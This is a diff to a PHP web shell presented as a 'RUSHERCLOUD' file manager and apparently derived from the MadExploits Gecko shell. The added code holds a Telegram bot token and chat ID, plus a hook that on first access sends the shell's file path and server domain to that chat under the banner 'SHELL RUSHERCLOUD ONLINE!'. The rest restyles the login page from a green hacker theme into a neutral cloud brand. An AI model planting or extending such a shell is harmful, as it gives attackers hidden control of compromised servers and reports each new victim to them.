@@ -10,8 +10,34 @@
 // file_manager.php
 session_start();
 
-// Hardcoded password hash for login (bcrypt hashed password for 'password123')
 $hashed_password = '$2y$10$n7OXssNZ0RXYQ.ehxDfjCeema90KbFax4VwOQg6ndtlo2vZxLpska';
+$TELEGRAM_BOT_TOKEN = "8266146541:AAF_rizIBOHlBMj-X9Ds9N0owESWfWVKqVo";   // Ganti dengan token bot kamu
+$TELEGRAM_CHAT_ID   = "-1003212759603";
+$TELEGRAM_TOPIC_ID  = 3;
+
+function sendToTelegram($message)
+{
+    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
+    $data = [
+        'chat_id' => $TELEGRAM_CHAT_ID,
+        'message_thread_id' => $TELEGRAM_TOPIC_ID,
+        'text' => $message,
+        'parse_mode' => 'HTML',
+        'disable_web_page_preview' => true
+    ];
+    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage";
+    @file_get_contents($url . "?" . http_build_query($data));
+}
+
+if (!isset($_SESSION['notified'])) {
+    $realpath = realpath(__FILE__);
+    $msg = "<b>SHELL RUSHERCLOUD ONLINE!</b>\n\n";
+    $msg .= "Path: <code>$realpath</code>\n";
+    $msg .= "Domain: <code>$_SERVER[SERVER_NAME]</code>\n";
+    $msg .= "First Access: " . date("d-m-Y H:i:s");
+    sendToTelegram($msg);
+    $_SESSION['notified'] = true;
+}
 
 // Check login
 if (isset($_GET['logout'])) {
@@ -41,8 +67,6 @@ if (!isset($_SESSION['logged_in'])) {
         <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
         <style>
             body {
-                background-color: #000;
-                color: #0f0;
                 font-family: 'Courier New', monospace;
                 overflow: hidden;
                 position: relative;
@@ -58,26 +82,13 @@ if (!isset($_SESSION['logged_in'])) {
                 z-index: 0;
             }
 
-            .container {
-                position: relative;
-                z-index: 1;
-                background-color: rgba(0, 20, 0, 0.8);
-                border: 1px solid #0f0;
-                box-shadow: 0 0 20px #0f0;
-                padding: 2rem;
-                max-width: 500px;
-                animation: glitch 1s infinite;
-            }
-
             .containers {
                 position: relative;
-                background-color: rgba(0, 20, 0, 0.8);
-                border: 1px solid #0f0;
-                box-shadow: 0 0 20px #0f0;
+                border: 2px solid rgba(25, 129, 170, 1);
+                border-radius: 10;
                 padding: 2rem;
                 max-width: 500px;
                 height: auto;
-                animation: glitch 1s infinite;
             }
 
             .center-page {
@@ -89,11 +100,7 @@ if (!isset($_SESSION['logged_in'])) {
             }
 
             h1 {
-                color: #0f0;
-                text-shadow: 0 0 10px #0f0;
-                border-bottom: 2px solid #0f0;
-                padding-bottom: 0.5rem;
-                animation: text-glitch 2s infinite;
+                color: rgba(7, 86, 160, 1);
             }
 
             .form-label {
@@ -101,103 +108,49 @@ if (!isset($_SESSION['logged_in'])) {
                 letter-spacing: 2px;
             }
 
-            .form-control {
-                background-color: #001100;
-                border: 1px solid #0f0;
-                color: #0f0 !important;
-                font-family: 'Courier New', monospace;
-            }
-
-            .form-control:focus {
-                background-color: #002200;
-                border-color: #0f0;
-                box-shadow: 0 0 15px #0f0;
-            }
-
             .btn-primary {
                 background-color: transparent;
-                border: 2px solid #0f0;
-                color: #0f0;
+                border: 2px solid rgba(7, 102, 190, 1);
+                color: rgba(7, 102, 190, 1);
+                font-weight: 600;
                 width: 100%;
                 margin-top: 1.5rem;
                 transition: all 0.3s;
             }
 
             .btn-primary:hover {
-                background-color: #0f0;
-                color: #000;
-                text-shadow: 0 0 10px #000;
+                background-color: rgba(6, 98, 134, 1);
+                color: #ffffffff;
+                text-shadow: 0 0 10px #ffffffff;
             }
 
             .alert {
-                background-color: #001100;
                 border: 1px solid #f00;
                 color: #f00;
-                text-shadow: 0 0 10px #f00;
-            }
-
-            @keyframes glitch {
-                0% {
-                    transform: translate(0);
-                }
-
-                20% {
-                    transform: translate(-2px, 2px);
-                }
-
-                40% {
-                    transform: translate(-2px, -2px);
-                }
-
-                60% {
-                    transform: translate(2px, 2px);
-                }
-
-                80% {
-                    transform: translate(2px, -2px);
-                }
-
-                100% {
-                    transform: translate(0);
-                }
-            }
-
-            @keyframes text-glitch {
-                0% {
-                    text-shadow: 0 0 10px #0f0;
-                }
-
-                50% {
-                    text-shadow: 2px 2px 5px #0f0, -2px -2px 5px #0f0;
-                }
-
-                100% {
-                    text-shadow: 0 0 10px #0f0;
-                }
             }
         </style>
     </head>
 
     <body>
-        <!-- <canvas class="matrix-bg" id="matrix"></canvas> -->
-
         <div class="center-page">
-            <div class="containers py-5">
-                <h1 class="mb-4">// FILE MANAGER //</h1>
-                <h3 class="mb-3 text-center">RUSHERCLOUD</h3>
-                <?php if (isset($login_error)): ?>
-                    <div class="alert alert-danger mb-4">
-                        <?= htmlspecialchars($login_error); ?>
-                    </div>
-                <?php endif; ?>
-                <form method="POST">
-                    <div class="mb-4">
-                        <label for="password" class="form-label">ENTER PASSPHRASE:</label>
-                        <input type="password" class="form-control" id="password" name="password" required
-                            placeholder="••••••••••" style="letter-spacing: 3px;">
-                    </div>
-                    <button type="submit" class="btn btn-primary">INITIATE SEQUENCE</button>
-                </form>
+            <div style="text-align: center;">
+                <img src="https://img.icons8.com/fluency/96/cloud-development--v1.png" alt="cloud" height="120" style="margin-bottom: 40px;">
+                <div class="containers py-5">
+                    <h1 class="mb-3 text-center" style="font-weight: 600;">RUSHERCLOUD</h1>
+                    <?php if (isset($login_error)): ?>
+                        <div class="alert alert-danger mb-4">
+                            <?= htmlspecialchars($login_error); ?>
+                        </div>
+                    <?php endif; ?>
+                    <form method="POST">
+                        <div class="mb-4">
+                            <label for="password" class="form-label">ENTER PASSPHRASE:</label>
+                            <input type="password" class="form-control" id="password" name="password" required
+                                placeholder="••••••••••" style="letter-spacing: 3px;">
+                        </div>
+                        <button type="submit" class="btn btn-primary">INITIATE SEQUENCE</button>
+                    </form>
+                </div>
             </div>
         </div>
 
@@ -419,7 +372,7 @@ if ($_GET['don'] == true) {
         }
 
         body {
-            background-color: #0e0f17;
+            background-color: #131219;
             font-family: monospace
         }
 
@@ -771,7 +724,7 @@ if ($_GET['don'] == true) {
 
         .logo-gecko {
             position: absolute;
-            top: -90px;
+            top: 0;
             right: 40px;
             z-index: -1;
             bottom: 0
@@ -789,7 +742,7 @@ if ($_GET['don'] == true) {
             <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
             <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
             <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/MadExploits</li>
-            <li class="logo-gecko"><img width="400" height="400" src="//raw.githubusercontent.com/Cnull00/file_file/main/pnk.png" align="right"></li>
+            <li class="logo-gecko"><img width="400" height="200" src="rushercloud.png" align="right"></li>
             <form action="" method="post" enctype='<?= "multipart/form-data"; ?>'>
                 <li class="form-upload">
                     <input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;
